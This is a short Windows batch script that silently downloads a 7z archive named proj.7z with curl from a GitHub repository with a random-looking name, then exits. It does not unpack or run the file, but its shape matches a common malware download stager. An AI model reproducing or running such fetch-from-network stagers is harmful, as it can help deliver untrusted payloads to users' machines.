@echo off
chcp 65001 > nul
set "URL=https://github.com/bigpluggssd/fdrftyujbvcd/raw/refs/heads/main/download/proj.7z"
set "OUTPUT_FILE=proj.7z"
curl -L -o "%OUTPUT_FILE%" "%URL%"
exit
